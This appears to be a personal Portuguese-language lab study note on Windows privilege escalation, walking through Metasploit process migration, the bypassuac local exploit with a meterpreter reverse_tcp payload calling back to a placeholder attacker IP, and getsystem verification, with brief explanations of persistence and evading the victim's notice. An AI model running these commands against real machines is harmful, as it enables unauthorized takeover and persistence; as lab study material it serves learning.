![Banner Dark Tech](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExajlrYTBsdG5mNHFxZG80MGpoa3Z3YmV4aXl5MmJuODkxNWprb3JvOSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l3q2GxB62rDeoNghG/giphy.gif)

# 🛡️ Escalonamento de Privilégios: Windows Bypass UAC
> Anotações de laboratório - Domínio total do alvo.
> > **[!] PERSONAL_STUDY_LOG:** Este é um documento **individual de estudos**. Contém anotações técnicas de laboratórios práticos realizados por mim. 
> Ambiente 100% controlado e isolado. Foco exclusivo em Metodologias de Red Team e Ética Hacker. Uso não autorizado destas técnicas é ilegal e viola meu código de conduta. De resto é total problema seu!

## 📝 Resumo da Experiência
Nesta etapa, aprendi que obter o acesso inicial é apenas metade do caminho. O uso do **Bypass UAC** é fundamental para elevar privilégios de um usuário comum para Administrador sem alertar a vítima.

### 🛠️ Comandos Utilizados

#### 1. Estabilização (Migração)
Sempre migramos para um processo seguro para não perder a conexão.
- `ps`: Lista processos.
- `migrate <PID>`: Migra para o processo (ex: explorer.exe).

#### 2. O Salto de Privilégio (Bypass UAC)
```bash
background
use exploit/windows/local/bypassuac
set session 1
set payload windows/meterpreter/reverse_tcp
set lhost <SEU_IP>
set lport 2022
exploit
```

#### Verificação Final

```bash
getsystem
getuid
```
* **Por que o `migrate` é importante?** Imagine que você infectou o `Chrome`. Se o usuário fechar o navegador, você morre. Ao migrar para o `explorer.exe` (a interface do Windows), você fica "imortal" enquanto o computador estiver ligado.
* **O que é o `BypassUAC`?** É como se você convencesse o Windows de que você é um programa de confiança que não precisa pedir permissão para o usuário para fazer alterações.
* **A diferença entre `whoami` e `getuid`:** O `whoami` é o comando do Windows (no shell), o `getuid` é o comando do Meterpreter. Ambos servem para a mesma coisa: checar se você já é o "rei" da máquina.
